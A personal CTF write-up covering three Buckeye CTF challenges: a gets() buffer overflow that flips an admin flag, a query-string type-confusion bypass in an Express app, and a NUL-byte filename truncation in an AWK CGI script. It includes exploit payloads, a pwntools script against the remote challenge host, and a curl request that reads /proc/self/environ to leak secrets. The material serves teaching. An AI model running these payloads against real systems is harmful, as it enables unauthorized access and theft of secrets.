---
tags:
  - CTF
  - Web
  - Pwn
  - buffer-overflow
  - xss
---
So whilst travelling back home, I had time on my hands since I arrived at the airport 5 HOURS early because I thought the traffic would be bad \*turns out it was ok.

Fortunately, Buckeye CTF was currently running so I decided to play a bit. Here I present some of the challenges I solved. 

---

## TL;DR

- **Viewer**: a tiny C program used `gets()` to read into a 10-byte buffer. A short overflow flips a neighboring boolean and prints the flag.
- **Big-Chungus**: a web app compared `req.query.username.length` to a huge number — tricking the query parser into making `username` an object with a big `length` revealed the flag.
- **Awklet**: an AWK CGI script accepted `%00` (NUL) in filenames, letting the process open arbitrary files like `/proc/self/environ` and print secrets.



---

## Viewer[PWN]

**Description**: A small C program prompts "What would you like to view?" and decides what to show based on your input and an `is_admin` flag. The author left a helpful source file available for inspection.
![](https://i.imgur.com/WFHf3oP.png)


**What to look for**

Always audit how input is read. This program uses `gets()` into `char input[10]`,  a classic unsafe pattern. `gets()` reads until newline with no bounds checking. 

Looking the provided code. Adjacent to `input` on the stack sits an `is_admin` boolean. That layout suggests a simple overflow can change program behavior without any advanced exploitation.

![](https://i.imgur.com/kOaGxlS.png)


**The idea**

Keep the first bytes of input as `flag\0` so the program's string check succeeds, then overflow the buffer to set `is_admin` to a non-zero value. No ROP or shellcode required, just overwriting that boolean.

Exact payload used (bytes shown in Python notation):

```python
b"flag\\x00" + b"A" * 10 + b"\\x01"
```

Compile with friendly flags so the stack layout is predictable while you learn:

```bash
gcc -o chall -g chall.c -fno-stack-protector -no-pie -z execstack
echo 'FLAG{penguins_are_cute}' > flag.txt
```
**First command - Compiling C code:**

- `gcc -o chall` - compiles `chall.c` into an executable named `chall`
- `-g` - includes debugging symbols
- `-fno-stack-protector` - disables stack protection (removes canaries that detect buffer overflows)
- `-no-pie` - disables Position Independent Executable (makes memory addresses predictable)
- `-z execstack` - makes the stack executable (allows code execution from stack memory)

**Second command - Creating a flag file:**

- Creates a text file named `flag.txt` containing the string "FLAG{penguins_are_cute}"

Then run the program and pipe the payload:

```bash
printf "flag\\x00AAAAAAAAAA\\x01\\n" | ./chall
```

Expected result: the program prints the contents of `flag.txt`.
![](https://i.imgur.com/RPUJwxA.png)

Quick definitions and technologies

- **gets()**: an unsafe C library call that reads a line into a buffer without bounds checking — deprecated and removed from modern standards.
- **Stack overflow**: writing past a local buffer into adjacent stack memory (here we overwrite a boolean, not a return address).

So for this challenge, there was a service we needed to connect to so I made some code to access the service and send our payload. See the code below:

```python
#!/usr/bin/env python3
from pwn import *
import sys

HOST = 'viewer.challs.pwnoh.io'
PORT = 1337

# Exploits the local binary by sending a crafted payload that overwrites memory # to bypass access control and read the flag file
def exploit_local(path='./chall'):
    p = process(path)
    payload = b"flag\x00" + b"A"*10 + b"\x01"
    p.sendline(payload)
    print(p.recvall(timeout=2).decode(errors='ignore'))

# Connects to the remote challenge server via SSL and sends the same payload 
# to retrieve the actual flag from the live service
def exploit_remote():
    # connect with SSL
    p = remote(HOST, PORT, ssl=True)
    payload = b"flag\x00" + b"A"*10 + b"\x01"
    p.sendline(payload)
    # receive until closed
    print(p.recvall(timeout=5).decode(errors='ignore'))

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        exploit_remote()
    else:
        exploit_local(path='./chall')

```

After I ran that I got the flag. 

---

## Big-Chungus[Web]

**Description**: a small Node/Express-style app renders pages based on `req.query.username`. There's an odd conditional: if `req.query.username.length > 0xB16_C4A6A5` then the app serves a "BIG CHUNGUS" page that contains the flag.

*Tip*: think about types, not just values

**The Vulnerability**

I looked at the route in `index.js` and saw it checks `req.query.username.length > 0xB16_C4A6A5`. If that is true it shows the BIG CHUNGUS page and prints `process.env.FLAG`. The hex number is huge, so no normal username string could meet that, which suggested the code was assuming `username` was a plain string.
```javascript
// ...existing code...
app.get("/", (req, res) => {
  if (req.query.username.length > 0xB16_C4A6A5) {
    res.send(`
      ...
      <div class="username blink">Welcome, ${req.query.username}!</div>
      ...
      <p style="font-size: 30px; color: lime;">FLAG: ${
        process.env.FLAG || "FLAG_NOT_SET"
      }</p>
      ...
    `);
    return;
  }
// ...existing code...
```

Many Node query parsers turn bracketed queries like `username[length]=...` into objects: `req.query.username = { length: "..." }`. If `req.query.username` is an object whose `length` property is the big number string, JavaScript will convert that string to a number for the `>` check, so the condition becomes true without sending a super‑long username. In short: the code trusts the shape/type of the input (`username`) instead of validating it, and that lets an attacker control the `length` used in the comparison.

```javascript
// ...existing code...
app.get("/", (req, res) => {
  if (!req.query.username) {
    res.send(`
      ...
      <form method="GET">
        <input type="text" name="username" placeholder="Enter username..." />
      </form>
      ...
    `);
    return;
  }

  // ...later in the handler...
  res.send(`
    ...
    <div class="username">Welcome, ${req.query.username}...</div>
    ...
  `);
});
// ...existing code...
```

**The trick**

Send this URL:

```url
https://big-chungus.challs.pwnoh.io/?username%5Blength%5D=47626626726
```

When parsed, `req.query.username` becomes `{ length: "47626626726" }`. The `>` comparison triggers numeric coercion of the string, the condition becomes true, and the server serves the page that contains `process.env.FLAG`.

Proof of Concept curl command used:

```bash
curl -s "https://big-chungus.challs.pwnoh.io/?username%5Blength%5D=47626626726" | sed -n '1,200p'
```

Definitions and tech notes

- Bracketed query keys (`username[length]=...`): common in parsers like `qs` and `querystring` with nested parsing enabled. They map into objects instead of flat strings.
- Type coercion in JS: when you compare a string to a number with `>`, JavaScript coerces the string to a number.
- Tools used: `curl` to fetch the URL and inspect the response.


---

## Awklet [Web]

Description: an AWK CGI script that renders ASCII art from a font file (a `.txt` file). The script reads a `font` parameter and appends `.txt`.

**Why AWK/C-boundary issues matter**

URL decoding can turn `%00` into a NULL byte inside AWK strings. When AWK passes that string to the C runtime for file I/O, the C APIs treat NULL as a terminator. So `'/proc/self/environ\\x00.txt'` becomes `/proc/self/environ` at the OS level.

Proof of Concept:

```bash
curl 'https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?font=/proc/self/environ%00&name=%20'
```

This requests `/proc/self/environ` as the font and asks the service to render a single space character (the font slot for ASCII 32). The server reads the file and prints lines from it — which included the flag for this challenge.

Definitions and tech notes

- NULL (`%00`) truncation: higher-level strings may contain NULL bytes, but C APIs interpret them as terminators. This mismatch can cause filename truncation.
- AWK `getline`: AWK uses the C runtime for file I/O; mixing AWK-level strings and C I/O is the root cause here.


That is all. Thanks for reading :>